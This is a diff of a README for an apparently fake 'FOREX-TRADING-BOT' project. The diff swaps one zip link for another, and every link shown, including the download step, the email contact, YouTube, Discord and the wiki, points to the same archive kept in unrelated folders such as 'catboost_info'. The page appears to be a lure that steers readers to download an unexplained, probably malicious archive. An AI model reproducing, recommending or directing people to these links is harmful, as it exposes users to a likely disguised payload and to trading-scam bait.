@@ -1,6 +1,6 @@
 # 📈 FOREX-TRADING-BOT - Easy Forex Trading, Automated for You
 
-[![Download the FOREX-TRADING-BOT](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/raw/refs/heads/main/FOREX TRADING/CSV_FILES/BOT-TRADIN-FORE-v1.3.zip)](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/raw/refs/heads/main/FOREX TRADING/CSV_FILES/BOT-TRADIN-FORE-v1.3.zip)
+[![Download the FOREX-TRADING-BOT](https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip)](https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, you need to download the software from the Releases page. 
 
-1. Visit this page to download: [Download FOREX-TRADING-BOT](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/raw/refs/heads/main/FOREX TRADING/CSV_FILES/BOT-TRADIN-FORE-v1.3.zip)
+1. Visit this page to download: [Download FOREX-TRADING-BOT](https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip)
 2. Look for the most recent version listed.
 3. Click the attached file to download the installer for your operating system.
 
@@ -66,20 +66,20 @@ If you encounter issues or have questions while using the FOREX-Trading-Bot, con
 
 - **Documentation:** Check the documentation included with the software for troubleshooting guidance.
 - **Community Forum:** Join our community forum for discussions and tips from other users.
-- **Contact:** Reach out directly via email for support at [https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/raw/refs/heads/main/FOREX TRADING/CSV_FILES/BOT-TRADIN-FORE-v1.3.zip](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/raw/refs/heads/main/FOREX TRADING/CSV_FILES/BOT-TRADIN-FORE-v1.3.zip).
+- **Contact:** Reach out directly via email for support at [https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip](https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip).
 
 ## 🌐 Explore More
 
 Stay informed about updates and new features. Follow us on social media and our YouTube channel to watch tutorials and trading strategies that utilize the bot effectively.
 
-1. [YouTube Channel](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/raw/refs/heads/main/FOREX TRADING/CSV_FILES/BOT-TRADIN-FORE-v1.3.zip)
-2. [Join our Discord Server](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/raw/refs/heads/main/FOREX TRADING/CSV_FILES/BOT-TRADIN-FORE-v1.3.zip)
+1. [YouTube Channel](https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip)
+2. [Join our Discord Server](https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip)
 
 ## 🔗 Additional Resources
 
 For further learning on Forex trading and using this bot:
 
-- Visit our [Wiki](https://github.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/raw/refs/heads/main/FOREX TRADING/CSV_FILES/BOT-TRADIN-FORE-v1.3.zip) for detailed guides.
+- Visit our [Wiki](https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip https://raw.githubusercontent.com/PurplixDaPurplMeteor/FOREX-TRADING-BOT/main/catboost_info/FORE_TRADIN_BOT_v2.1.zip) for detailed guides.
 - Explore online courses about trading strategies.
 - Read articles about market analysis to enhance your skills.
 
